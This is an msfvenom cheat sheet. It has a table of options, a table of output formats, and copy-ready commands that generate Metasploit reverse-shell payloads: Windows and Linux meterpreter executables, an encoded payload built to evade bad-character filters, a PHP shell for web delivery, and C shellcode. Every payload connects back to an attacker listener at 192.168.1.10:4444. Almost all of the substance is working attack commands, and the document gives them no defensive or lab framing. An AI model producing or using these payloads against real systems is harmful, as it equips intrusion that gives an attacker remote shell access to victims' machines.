---
## 📌 Basic Syntax

---
## 🧰 Common Options

| Option       | Description                                                 |
| ------------ | ----------------------------------------------------------- |
| `-p`         | Specify the payload (e.g., windows/meterpreter/reverse_tcp) |
| `LHOST`      | Local host IP (attacker's IP)                               |
| `LPORT`      | Local port to listen on                                     |
| `-f`         | Output format (e.g., exe, elf, raw, c, python)              |
| `-o`         | Output file                                                 |
| `-e`         | Encoder (e.g., x86/shikata_ga_nai)                          |
| `-b`         | Bad characters to avoid (e.g., `\x00\x0a`)                  |
| `-a`         | Architecture (e.g., x86, x64)                               |
| `--platform` | Target OS (e.g., Windows, Linux)                            |
| `-i`         | Number of encoding iterations                               |

---

## 🚀 Payload Examples

### 1. **Windows Reverse Shell**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
```

## Linux Reverse Shell

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf
```

## Encoded Payload (Avoiding Bad Chars)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 3 -b "\x00\x0a" -f exe -o encoded_shell.exe
```

## Payload for Web Delivery (PHP)
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php
```

## Output Formats

|Format|Description|
|---|---|
|exe|Windows Executable|
|elf|Linux Executable|
|asp|ASP Script|
|aspx|ASP.NET Script|
|php|PHP Script|
|raw|Raw Shellcode|
|c|C Source Code|
|python|Python Script|
|js|JavaScript|

## Shellcode Generation (C Example)

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c
```

## List Available Payloads
```
msfvenom -h
```












